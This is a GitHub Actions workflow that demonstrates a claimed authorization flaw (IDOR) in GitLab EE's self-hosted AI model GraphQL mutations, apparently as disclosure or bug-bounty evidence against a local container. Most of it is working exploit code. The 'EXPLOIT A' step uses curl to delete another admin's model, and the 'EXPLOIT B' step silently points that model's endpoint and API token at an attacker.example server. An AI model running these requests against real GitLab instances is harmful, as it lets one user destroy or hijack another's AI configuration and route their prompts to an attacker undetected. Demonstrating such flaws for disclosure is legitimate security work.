name: GitLab IDOR PoE — aiSelfHostedModelUpdate/Delete

on:
  workflow_dispatch:

jobs:
  poe:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Start GitLab EE container
        run: |
          docker run -d \
            --hostname localhost \
            --name gitlab-idor-poe \
            -p 8181:80 \
            -e GITLAB_ROOT_PASSWORD="xK9#mP2vL8nQ5!" \
            -e GITLAB_OMNIBUS_CONFIG="gitlab_rails['initial_root_password']='xK9#mP2vL8nQ5!'; gitlab_rails['gitlab_signup_enabled']=true;" \
            --shm-size 256m \
            gitlab/gitlab-ee:latest
          echo "Container started: $(docker ps -q --filter name=gitlab-idor-poe)"

      - name: Wait for GitLab API to be ready
        run: |
          echo "Waiting for GitLab to initialize..."
          for i in $(seq 1 60); do
            if curl -sf http://localhost:8181/api/v4/version -o /dev/null 2>/dev/null; then
              echo "GitLab ready after $((i * 10))s"
              curl -sf http://localhost:8181/api/v4/version
              break
            fi
            sleep 10
            echo -n "[$((i*10))s]"
          done

      - name: Create root PAT
        run: |
          ROOT_PAT=$(docker exec gitlab-idor-poe \
            gitlab-rails runner \
            "t=User.find_by_username('root').personal_access_tokens.create!(name:'root-poe',scopes:['api'],expires_at:7.days.from_now); puts t.token" \
            2>/dev/null | tail -1)
          echo "ROOT_PAT=${ROOT_PAT}" >> $GITHUB_ENV
          echo "Root PAT acquired: ${ROOT_PAT:0:8}..."

      - name: Create User A (alice_admin — victim)
        run: |
          USER_A_ID=$(docker exec gitlab-idor-poe gitlab-rails runner "
            u = User.create!(
              name: 'Alice Admin',
              username: 'alice_admin',
              email: 'alice@idor-poe.local',
              password: 'AlicePass99!#',
              admin: true,
              skip_confirmation: true
            )
            puts u.id
          " 2>/dev/null | tail -1)
          echo "USER_A_ID=${USER_A_ID}" >> $GITHUB_ENV
          echo "User A (alice_admin) created — id=${USER_A_ID}"

      - name: Create User B (bob_admin — attacker)
        run: |
          USER_B_ID=$(docker exec gitlab-idor-poe gitlab-rails runner "
            u = User.create!(
              name: 'Bob Admin',
              username: 'bob_admin',
              email: 'bob@idor-poe.local',
              password: 'BobPass99!#xZ',
              admin: true,
              skip_confirmation: true
            )
            puts u.id
          " 2>/dev/null | tail -1)
          echo "USER_B_ID=${USER_B_ID}" >> $GITHUB_ENV
          echo "User B (bob_admin) created — id=${USER_B_ID}"

      - name: Create PATs for User A and User B
        run: |
          USER_A_PAT=$(docker exec gitlab-idor-poe gitlab-rails runner "
            t = User.find($USER_A_ID).personal_access_tokens.create!(
              name: 'alice-poe', scopes: ['api'], expires_at: 7.days.from_now
            )
            puts t.token
          " 2>/dev/null | tail -1)

          USER_B_PAT=$(docker exec gitlab-idor-poe gitlab-rails runner "
            t = User.find($USER_B_ID).personal_access_tokens.create!(
              name: 'bob-poe', scopes: ['api'], expires_at: 7.days.from_now
            )
            puts t.token
          " 2>/dev/null | tail -1)

          echo "USER_A_PAT=${USER_A_PAT}" >> $GITHUB_ENV
          echo "USER_B_PAT=${USER_B_PAT}" >> $GITHUB_ENV
          echo "User A PAT: ${USER_A_PAT:0:8}..."
          echo "User B PAT: ${USER_B_PAT:0:8}..."

      - name: Confirm policy file is MISSING (code-layer evidence)
        run: |
          echo "=== Checking for Ai::SelfHostedModelPolicy ==="
          docker exec gitlab-idor-poe bash -c \
            "ls /opt/gitlab/embedded/service/gitlab-rails/ee/app/policies/ai/self_hosted_model_policy.rb 2>&1 || echo 'POLICY FILE MISSING — no per-object authorization exists'"
          echo ""
          echo "=== Vulnerable update.rb (object_from_id instead of authorized_find!) ==="
          docker exec gitlab-idor-poe cat \
            /opt/gitlab/embedded/service/gitlab-rails/ee/app/graphql/mutations/ai/self_hosted_models/update.rb 2>/dev/null || echo "FILE_NOT_FOUND"
          echo ""
          echo "=== Vulnerable delete.rb ==="
          docker exec gitlab-idor-poe cat \
            /opt/gitlab/embedded/service/gitlab-rails/ee/app/graphql/mutations/ai/self_hosted_models/delete.rb 2>/dev/null || echo "FILE_NOT_FOUND"
          echo ""
          echo "=== Correct pattern (agents/base.rb uses authorized_find!) ==="
          docker exec gitlab-idor-poe grep -A5 "authorized_find\|authorize :" \
            /opt/gitlab/embedded/service/gitlab-rails/ee/app/graphql/mutations/ai/agents/base.rb 2>/dev/null || echo "NOT_FOUND"

      - name: Seed Ai::SelfHostedModel as User A (victim)
        run: |
          MODEL_GID=$(docker exec gitlab-idor-poe gitlab-rails runner "
            ::Ai::SelfHostedModel.where(name: 'victim-model').destroy_all rescue nil
            m = ::Ai::SelfHostedModel.create!(
              name: 'victim-model',
              model: 'mistral',
              endpoint: 'https://victim.example/v1',
              api_token: 'victim-secret-token'
            )
            puts 'gid://gitlab/Ai::SelfHostedModel/' + m.id.to_s
          " 2>/dev/null | tail -1)
          echo "MODEL_GID=${MODEL_GID}" >> $GITHUB_ENV
          echo "Model created by User A: ${MODEL_GID}"

      - name: EXPLOIT A — User B DELETES User A's model (no ownership check)
        run: |
          echo "=== DELETE EXPLOIT ==="
          echo "Attacker: bob_admin (User B)"
          echo "Victim model: $MODEL_GID"
          echo ""
          echo "GraphQL mutation:"
          echo "mutation { aiSelfHostedModelDelete(input: { id: \"$MODEL_GID\" }) { errors } }"
          echo ""
          DELETE_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
            -H "Authorization: Bearer $USER_B_PAT" \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"mutation { aiSelfHostedModelDelete(input: { id: \\\"$MODEL_GID\\\" }) { errors } }\"}")
          echo "Response: $DELETE_RESP"
          echo ""
          if echo "$DELETE_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('data',{}).get('aiSelfHostedModelDelete',{}).get('errors',['PARSE']); print('RESULT: errors=' + str(e)); exit(0 if e==[] else 1)" 2>/dev/null; then
            echo "✅ DELETE IDOR CONFIRMED: errors:[] — User B deleted User A's model with no authorization"
          else
            echo "DELETE response parsed — check above"
          fi

      - name: Recreate model for UPDATE test
        run: |
          MODEL_GID2=$(docker exec gitlab-idor-poe gitlab-rails runner "
            m = ::Ai::SelfHostedModel.create!(
              name: 'victim-model-2',
              model: 'mistral',
              endpoint: 'https://victim.example/v1',
              api_token: 'victim-secret-token'
            )
            puts 'gid://gitlab/Ai::SelfHostedModel/' + m.id.to_s
          " 2>/dev/null | tail -1)
          echo "MODEL_GID2=${MODEL_GID2}" >> $GITHUB_ENV
          echo "Model 2 for UPDATE test: ${MODEL_GID2}"

      - name: EXPLOIT B — User B silently hijacks endpoint + API token
        run: |
          echo "=== UPDATE EXPLOIT (silent endpoint hijack) ==="
          echo "Attacker: bob_admin (User B)"
          echo "Target model: $MODEL_GID2"
          echo ""
          UPDATE_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
            -H "Authorization: Bearer $USER_B_PAT" \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"mutation { aiSelfHostedModelUpdate(input: { id: \\\"$MODEL_GID2\\\", endpoint: \\\"https://attacker.example/v1\\\", apiToken: \\\"attacker-controlled-token\\\" }) { selfHostedModel { id endpoint } errors } }\"}")
          echo "Response: $UPDATE_RESP"
          echo ""
          python3 -c "
          import sys, json
          d = json.loads('$UPDATE_RESP'.replace(\"'\", '\"'))
          r = d.get('data',{}).get('aiSelfHostedModelUpdate',{})
          errors = r.get('errors', ['PARSE'])
          endpoint = r.get('selfHostedModel', {}).get('endpoint', 'N/A')
          print('errors:', errors)
          print('endpoint in response:', endpoint)
          if errors == [] and 'attacker' in endpoint:
              print('✅ UPDATE IDOR CONFIRMED: errors:[] — endpoint silently replaced with attacker-controlled server')
              print('   All AI prompts from victim namespace now route to: ' + endpoint)
          " 2>/dev/null || echo "UPDATE response: $UPDATE_RESP"

      - name: Verify victim sees no change (attack is undetectable)
        run: |
          echo "=== VICTIM PERSPECTIVE after attack ==="
          echo "Querying as alice_admin (User A)..."
          VICTIM_VIEW=$(curl -s -X POST "http://localhost:8181/api/graphql" \
            -H "Authorization: Bearer $USER_A_PAT" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ aiSelfHostedModels { nodes { id name endpoint } } }"}')
          echo "User A sees: $VICTIM_VIEW"
          echo "(Model name unchanged — endpoint silently points to attacker server — undetectable)"

      - name: GitLab version confirmation
        run: |
          echo "=== GitLab Version ==="
          curl -sf http://localhost:8181/api/v4/version
          echo ""
          echo "=== Image digest ==="
          docker inspect gitlab-idor-poe --format '{{.Image}}' | head -1
